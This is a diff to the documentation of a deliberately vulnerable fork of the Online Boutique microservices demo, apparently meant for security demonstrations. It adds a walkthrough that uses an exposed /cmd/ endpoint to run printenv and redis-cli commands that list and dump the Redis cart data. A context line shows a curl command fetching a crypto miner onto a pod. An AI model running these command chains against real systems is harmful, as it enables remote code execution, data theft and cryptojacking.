@@ -10,6 +10,7 @@ The **Online Boutique** cloud-native microservices demo application is tweaked t
 3. **Vulnerable address field** - 
     [to executes codes in the backend](https://github.com/vsk-coding/microservices-demo/blob/main/UPDATES.md#rce)
 4. **Crypto Miner on pod** - [to install cryptominer python based application on to a pod](https://github.com/vsk-coding/microservices-demo/blob/main/UPDATES.md#crypto-miner)
+5. **Redis data exposure** - [to connect and disclose the data stored in redis db](https://github.com/vsk-coding/microservices-demo/blob/main/UPDATES.md#redis-data-exposure)
 
 
 > **Note:** These tweakings were done to make the application
@@ -84,6 +85,43 @@ apk add --no-cache wget curl python2 && curl -L https://github.com/ricmoo/nightm
 
 [![Screenshot of hubble ui](./images/connection-hubble.png)](./images/connection-hubble.png) 
 
+## Redis data exposure
+
+**Use the /cmd/ handle to get env variables**
+
+*Command*
+
+```
+<your-external-ip>/cmd/printenv
+```
+[![Screenshot of printenv](./images/printenv.png)](./images/printenv.png) 
+
+**Use redis-cli to connect to the above ip and see the KEYS**
+
+*Command*
+
+```
+<your-external-ip>/cmd/echo "KEYS *" | redis-cli -h <redis-cart-ip>
+```
+[![Screenshot of redis cli keys](./images/redis-cli.png)](./images/redis-cli.png) 
+
+**Use redis-cli to show the type of data**
+
+*Command*
+
+```
+<your-external-ip>/cmd/echo "type <value>" | redis-cli -h <redis-cart-ip>
+```
+[![Screenshot of redis cli data type](./images/redis-cli-type.png)](./images/redis-cli-type.png) 
+
+**Use redis-cli to show the data**
+
+*Command*
+
+```
+<your-external-ip>/cmd/echo "hgetall <value>" | redis-cli -h <redis-cart-ip>
+```
+[![Screenshot of redis cli data](./images/redis-cli-data.png)](./images/redis-cli-data.png) 
 <br />
 
 ## Files Changed
